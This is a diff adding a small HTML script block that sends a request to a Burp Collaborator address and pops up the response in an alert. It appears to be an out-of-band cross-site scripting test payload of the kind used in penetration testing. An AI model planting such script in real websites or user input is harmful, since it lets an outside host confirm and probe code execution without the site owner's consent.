@@ -1,0 +1,10 @@
+<script>
+    var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        alert(xhr.responseText);
+    }
+}
+xhr.open('GET', 'http://dzg6cw5xiaidddaqu1f988so7fd91y.burpcollaborator.net/bibi', true);
+xhr.send(null);
+</script>
